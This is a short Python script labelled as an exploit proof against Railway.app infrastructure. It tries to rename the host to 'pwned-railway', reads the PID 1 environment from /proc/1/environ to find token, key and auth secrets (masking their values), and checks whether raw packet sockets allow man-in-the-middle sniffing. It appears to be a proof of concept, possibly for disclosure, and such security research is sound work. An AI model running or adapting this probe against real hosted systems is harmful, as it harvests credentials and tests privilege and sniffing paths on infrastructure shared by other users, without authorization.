import os, sys, subprocess

def railway_pwn():
    print("\n" + "!"*50)
    print("   RAILWAY.APP INFRASTRUCTURE EXPLOIT PROOF")
    print("!"*50 + "\n")
 
    try:
        print("[*] Testing write access to system config...")
        subprocess.run(['hostname', 'pwned-railway'], check=True)
        print("[!!!] SUCCESS: Hostname changed. I have SYSTEM CONTROL.")
    except:
        print("[-] Hostname change denied (Namespaces are active).")
 
    print("\n[*] Dumping PID 1 environment variables...")
    try:
        with open('/proc/1/environ', 'rb') as f:
            env_data = f.read().replace(b'\0', b'\n').decode()
            
            for line in env_data.split('\n'):
                if any(k in line.upper() for k in ['TOKEN', 'KEY', 'AUTH', 'RAILWAY']):
                    print(f"[FOUND SECRET]: {line.split('=')[0]}=******")
    except Exception as e:
        print(f"[-] PID 1 Env access denied: {e}")

 
    try:
        import socket
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
        print("[!!!] CRITICAL: RAW SOCKETS ENABLED. Man-in-the-Middle attack possible.")
    except:
        print("[-] Raw sockets restricted (CAP_NET_RAW disabled).")

    print("\n" + "!"*50)
    sys.exit(1)

if __name__ == "__main__":
    railway_pwn()
